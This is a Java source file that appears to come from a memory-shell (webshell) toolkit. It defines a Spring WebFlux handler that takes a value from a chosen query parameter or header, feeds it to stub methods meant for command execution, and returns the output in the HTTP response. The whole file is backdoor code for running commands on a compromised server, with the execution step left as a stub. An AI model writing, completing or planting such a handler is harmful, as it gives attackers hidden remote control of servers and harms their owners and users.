package com.reajason.javaweb.memshell.shelltool.command;

import org.springframework.web.reactive.function.server.HandlerFunction;
import org.springframework.web.reactive.function.server.ServerRequest;
import org.springframework.web.reactive.function.server.ServerResponse;
import reactor.core.publisher.Mono;
import reactor.core.scheduler.Schedulers;

import java.io.InputStream;
import java.util.Optional;
import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2024/12/25
 */
public class CommandHandlerFunction implements HandlerFunction<ServerResponse> {
    public static String paramName;

    @Override
    public Mono<ServerResponse> handle(ServerRequest request) {
        String p = null;
        Optional<String> paramOptional = request.queryParam(paramName);
        if (paramOptional.isPresent()) {
            p = paramOptional.get();
        }
        if (p == null || p.isEmpty()) {
            p = request.headers().firstHeader(paramName);
        }
        final String paramValue = p;
        Mono<String> resultMono = Mono.fromCallable(() -> {
            String result = "";
            try {
                if (paramValue != null) {
                    String param = getParam(paramValue);
                    InputStream inputStream = getInputStream(param);
                    result = new Scanner(inputStream).useDelimiter("\\A").next();
                }
            } catch (Throwable e) {
                e.printStackTrace();
            }
            return result;
        }).subscribeOn(Schedulers.boundedElastic());
        return ServerResponse.ok().body(resultMono, String.class);
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
